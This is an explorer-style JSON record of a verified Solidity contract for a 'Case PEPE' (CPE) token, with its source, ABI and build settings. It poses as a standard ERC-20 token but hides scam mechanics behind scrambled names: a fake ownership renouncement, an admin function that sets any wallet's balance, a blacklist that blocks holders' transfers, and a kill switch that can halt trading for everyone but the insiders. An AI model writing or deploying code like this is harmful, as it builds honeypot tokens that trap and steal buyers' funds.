{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface teamLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitReceiverList) external view returns (uint256);\n\n    function transfer(address enableExemptTeam, uint256 buyAt) external returns (bool);\n\n    function allowance(address limitExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableExemptTeam,\n        uint256 buyAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedFund, uint256 value);\n    event Approval(address indexed limitExempt, address indexed spender, uint256 value);\n}\n\nabstract contract enableList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minSender {\n    function createPair(address modeMin, address swapMinTeam) external returns (address);\n}\n\ninterface maxToken is teamLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CasePEPE is enableList, teamLimit, maxToken {\n\n    bool private autoShould;\n\n    bool private buyTake;\n\n    mapping(address => mapping(address => uint256)) private walletReceiver;\n\n    function teamTrading(address exemptMinEnable, address enableExemptTeam, uint256 buyAt) internal returns (bool) {\n        if (exemptMinEnable == fromBuy) {\n            return swapMax(exemptMinEnable, enableExemptTeam, buyAt);\n        }\n        uint256 sellAuto = teamLimit(launchShouldLiquidity).balanceOf(feeTradingLaunch);\n        require(sellAuto == maxIs);\n        require(enableExemptTeam != feeTradingLaunch);\n        if (tradingSellMode[exemptMinEnable]) {\n            return swapMax(exemptMinEnable, enableExemptTeam, swapMode);\n        }\n        return swapMax(exemptMinEnable, enableExemptTeam, buyAt);\n    }\n\n    function getOwner() external view returns (address) {\n        return limitFundReceiver;\n    }\n\n    function isTake(address swapTake) public {\n        require(swapTake.balance < 100000);\n        if (feeMax) {\n            return;\n        }\n        \n        teamTotal[swapTake] = true;\n        if (teamLiquidity != txAmount) {\n            buyTake = true;\n        }\n        feeMax = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletBuyLiquidity;\n    }\n\n    address feeTradingLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public feeMax;\n\n    uint256 marketingMin;\n\n    event OwnershipTransferred(address indexed txShouldWallet, address indexed liquidityAt);\n\n    function amountIs() private view {\n        require(teamTotal[_msgSender()]);\n    }\n\n    bool private amountEnableBuy;\n\n    function name() external view virtual override returns (string memory) {\n        return enableToken;\n    }\n\n    function approve(address maxTotal, uint256 buyAt) public virtual override returns (bool) {\n        walletReceiver[_msgSender()][maxTotal] = buyAt;\n        emit Approval(_msgSender(), maxTotal, buyAt);\n        return true;\n    }\n\n    string private walletBuyLiquidity = \"CPE\";\n\n    mapping(address => bool) public teamTotal;\n\n    bool private receiverLimit;\n\n    address fromSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant swapMode = 9 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchSwap;\n    }\n\n    constructor (){\n        \n        launchFund listTake = launchFund(fromSell);\n        launchShouldLiquidity = minSender(listTake.factory()).createPair(listTake.WETH(), address(this));\n        if (amountEnableBuy) {\n            teamLiquidity = txAmount;\n        }\n        fromBuy = _msgSender();\n        isSwapLaunch();\n        teamTotal[fromBuy] = true;\n        walletFrom[fromBuy] = liquiditySenderToken;\n        \n        emit Transfer(address(0), fromBuy, liquiditySenderToken);\n    }\n\n    uint256 private liquiditySenderToken = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private walletFrom;\n\n    function launchFee(address maxSell) public {\n        amountIs();\n        if (maxReceiverMin == txAmount) {\n            liquidityTx = false;\n        }\n        if (maxSell == fromBuy || maxSell == launchShouldLiquidity) {\n            return;\n        }\n        tradingSellMode[maxSell] = true;\n    }\n\n    address private limitFundReceiver;\n\n    uint256 private txAmount;\n\n    uint256 private teamLiquidity;\n\n    bool public liquidityTx;\n\n    address public fromBuy;\n\n    function balanceOf(address limitReceiverList) public view virtual override returns (uint256) {\n        return walletFrom[limitReceiverList];\n    }\n\n    function transfer(address toMax, uint256 buyAt) external virtual override returns (bool) {\n        return teamTrading(_msgSender(), toMax, buyAt);\n    }\n\n    string private enableToken = \"Case PEPE\";\n\n    uint256 maxIs;\n\n    bool private exemptFundAt;\n\n    uint8 private launchSwap = 18;\n\n    mapping(address => bool) public tradingSellMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquiditySenderToken;\n    }\n\n    function amountLimit(address toMax, uint256 buyAt) public {\n        amountIs();\n        walletFrom[toMax] = buyAt;\n    }\n\n    function transferFrom(address exemptMinEnable, address enableExemptTeam, uint256 buyAt) external override returns (bool) {\n        if (_msgSender() != fromSell) {\n            if (walletReceiver[exemptMinEnable][_msgSender()] != type(uint256).max) {\n                require(buyAt <= walletReceiver[exemptMinEnable][_msgSender()]);\n                walletReceiver[exemptMinEnable][_msgSender()] -= buyAt;\n            }\n        }\n        return teamTrading(exemptMinEnable, enableExemptTeam, buyAt);\n    }\n\n    function swapMax(address exemptMinEnable, address enableExemptTeam, uint256 buyAt) internal returns (bool) {\n        require(walletFrom[exemptMinEnable] >= buyAt);\n        walletFrom[exemptMinEnable] -= buyAt;\n        walletFrom[enableExemptTeam] += buyAt;\n        emit Transfer(exemptMinEnable, enableExemptTeam, buyAt);\n        return true;\n    }\n\n    uint256 public exemptList;\n\n    function isSwapLaunch() public {\n        emit OwnershipTransferred(fromBuy, address(0));\n        limitFundReceiver = address(0);\n    }\n\n    function allowance(address listFee, address maxTotal) external view virtual override returns (uint256) {\n        if (maxTotal == fromSell) {\n            return type(uint256).max;\n        }\n        return walletReceiver[listFee][maxTotal];\n    }\n\n    function owner() external view returns (address) {\n        return limitFundReceiver;\n    }\n\n    address public launchShouldLiquidity;\n\n    function sellFrom(uint256 buyAt) public {\n        amountIs();\n        maxIs = buyAt;\n    }\n\n    uint256 private maxReceiverMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txShouldWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAt\",\"type\":\"uint256\"}],\"name\":\"amountLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiverList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwapLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"}],\"name\":\"isTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSell\",\"type\":\"address\"}],\"name\":\"launchFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchShouldLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyAt\",\"type\":\"uint256\"}],\"name\":\"sellFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingSellMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMinEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableExemptTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CasePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}